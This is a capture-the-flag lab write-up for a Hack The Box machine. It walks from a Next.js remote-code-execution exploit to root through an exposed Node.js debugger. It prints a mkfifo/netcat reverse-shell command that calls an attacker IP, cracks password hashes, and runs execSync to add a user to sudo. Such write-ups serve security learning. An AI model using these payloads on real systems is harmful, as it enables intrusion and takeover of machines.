Reactor

Hack The Box  ·  category: web / privesc  ·  foothold → root

Recon

I started with an Nmap service scan of the target.

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?

The target was running SSH on port 22 and an unknown service on port 3000. Digging into the scan results, the application looked like it was powered by Next.js — which by default runs on port 3000, so that lined up.

Web enumeration

The front page appeared to be some kind of reactor monitoring service. There were no visible input fields or obvious attack surfaces, so I moved on to the source code and found several JavaScript paths: 

http://10.129.3.166:3000/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js
http://10.129.3.166:3000/_next/static/chunks/webpack-db0a529a99835594.js
http://10.129.3.166:3000/_next/static/chunks/main-app-4fbb4b1f318e39a0.js

I assumed these files might contain useful functions or endpoints, but after inspecting them I found nothing interesting. I then ran directory and subdomain enumeration with multiple wordlists for about an hour — still nothing useful.

My next move was to fingerprint the exact Next.js version to look for known vulnerabilities. Using Wappalyzer, I confirmed the app was running Next.js 15.0.3. Searching for CVEs and proof-of-concepts for that version, I found a working exploit:

CVE-2025-55182 — PoC repository

Foothold

With a working RCE PoC in hand, I went for a reverse shell. This was the only payload that worked reliably — a standard bash -i reverse shell failed: 

python3 poc.py http://10.129.6.163:3000/ \
  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.15.82 4444 >/tmp/f"

Once I had a shell, I listed the current directory and spotted a file named reactor.db. cat gave unreadable output, so I ran strings on it, which revealed two MD5 password hashes: 

engineer:39d97110eafe2a9a68639812cd271e8e
admin:a203b22191d744a4e70ada5c101b17b8

I confirmed the hash type with hashid (MD5) and cracked them with John the Ripper against rockyou.txt: 

engineer:reactor1
admin:(not cracked)

The engineer password cracked, which let me SSH into the box and grab the user flag. The admin hash didn't fall to rockyou.txt.

User flag

engineer@reactor:~$ cat user.txt
<user-flag-here>

Privilege escalation

First I checked for sudo rights — the user had none:

engineer@reactor:~$ sudo -l
# no sudo privileges

Next I uploaded and ran linpeas, which flagged an interesting process: 

root  1390  ...  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js

Node.js was running as root with the debugger enabled locally on port 9229. I connected to it: 

engineer@reactor:~$ node inspect 127.0.0.1:9229

The connection worked. Using help inside the debugger I found the exec functionality. Rather than spawn a shell directly, I added my user to the sudo group as root: 

debug> exec('process.mainModule.require("child_process").execSync("usermod -aG sudo engineer")')

Then I verified the group membership had changed:

engineer@reactor:~$ groups
engineer adm cdrom sudo dip plugdev lxd

Finally, I switched to root and grabbed the root flag:

engineer@reactor:~$ sudo su -
root@reactor:~# cat root.txt
<root-flag-here>

Takeaways

  • An unknown service on a default framework port (3000 → Next.js) is worth fingerprinting precisely — the exact version led straight to CVE-2025-55182.
  • When a standard reverse shell fails, a mkfifo-based payload is a reliable fallback.
  • A local-only Node debugger (--inspect) running as root is a full privesc: the exec console runs arbitrary code with that process's privileges.
